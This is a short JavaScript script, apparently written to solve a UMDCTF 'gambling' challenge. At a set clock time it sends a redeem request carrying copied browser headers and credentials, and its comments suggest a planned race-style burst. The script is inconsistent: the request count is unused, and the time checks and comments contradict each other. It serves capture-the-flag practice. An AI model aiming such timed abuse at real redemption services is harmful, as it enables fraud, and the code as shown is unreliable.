const URL = "https://gambling.challs.umdctf.io/redeem";
const headers = {
    "accept": "*/*",
    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
    "authorization": "{\"username\":\"aaaabbbc\",\"password\":\"aaaabbbc\"}",
    "content-type": "application/json",
    "priority": "u=1, i",
    "sec-ch-ua": "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
};

const body = "\"eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/\"";

// 몇 번 동시에 때릴지 설정
const NUM_REQUESTS = 30;  

async function sendRequest() {
    return fetch(URL, {
        method: "POST",
        headers: headers,
        body: body,
        mode: "cors",
        credentials: "include",
        referrer: "https://gambling.challs.umdctf.io/",
        referrerPolicy: "strict-origin-when-cross-origin"
    }).then(response => response.text())
      .then(result => console.log(result))
      .catch(error => console.error("Error:", error));
}

function waitUntilNoon() {
    const interval = setInterval(() => {
        const now = new Date();
        if (now.getHours() === 0 && now.getMinutes() === 10 && now.getSeconds() === 0) {
            console.log("24:00:00! Sending request...");
            sendRequest();
            clearInterval(interval); // 한 번 보내고 종료
        }
    }, 20); // 0.2초마다 체크 (조금 더 정확하게 맞추려고 짧게)
}

waitUntilNoon();